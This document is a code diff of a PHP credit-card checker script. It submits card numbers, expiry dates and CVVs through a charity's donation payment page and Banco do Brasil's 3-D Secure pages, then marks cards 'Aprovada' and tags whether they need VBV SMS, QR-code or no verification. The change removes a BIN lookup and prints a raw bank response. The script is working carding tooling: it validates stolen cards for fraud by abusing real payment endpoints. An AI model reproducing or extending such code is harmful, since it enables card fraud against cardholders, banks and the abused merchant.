@@ -82,15 +82,6 @@ if ($bin[0] == 4) {
     $r_customer    = 'https://www66.bb.com.br/SecureCodeAuth/gcs/statics/gas/validacao.bb?urlRetorno=/SecureCodeAuth/scdLogin/customer.bb';
 }
 
-//bin
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://localhost/Painel/Checkers/bin.php?bin=' . $bin . '');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-$bin11 = curl_exec($ch);
-
 #====================================================================================================#
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://www.kuranhalkalari.org/bagis/Payment.php');
@@ -158,7 +149,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'TermUrl=' . urlencode($TermUrl) . '&PaReq=
 $Inicio = curl_exec($ch);
 
 if (strpos($Inicio, 'Abra o aplicativo do BB em seu smartphone')) {
-    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-info">' . $bin11 . '</span> <span class="badge badge-success">[ VBV QRCODE ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';
+    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-success">[ VBV QRCODE ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';
 
     exit();
 } elseif (strpos($Inicio, 'Ocorreu um erro durante o processamento de sua')) {
@@ -180,14 +171,14 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
     'Referer: ' . $r_customer . '',
     'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,id;q=0.6,es;q=0.5'
 ));
-$Custumer = curl_exec($ch);
+echo $Custumer = curl_exec($ch);
 
 if (strpos($Custumer, 'Prezado cliente, voc&ecirc; n&atilde;o possui o M&oacute')) {
-    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-info">' . $bin11 . '</span> <span class="badge badge-success">[ SEM VBV ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';
+    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-success">[ SEM VBV ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';
 
     exit();
 } elseif (strpos($Custumer, 'Selecione um celular para receber ')) {
-    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-info">' . $bin11 . '</span> <span class="badge badge-success">[ VBV SMS ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';
+    echo '<span class="badge badge-success"> Aprovada </span> <span style="color: black;"> → <span class="badge badge-light">' . $cc . ' » ' . $mes . ' » ' . $ano . ' » ' . $cvv . '</span> | <span class="badge badge-success">[ VBV SMS ]</span> | <span class="badge badge-dark">@y0rkzin</span></br>';
 
     exit();
 } else {
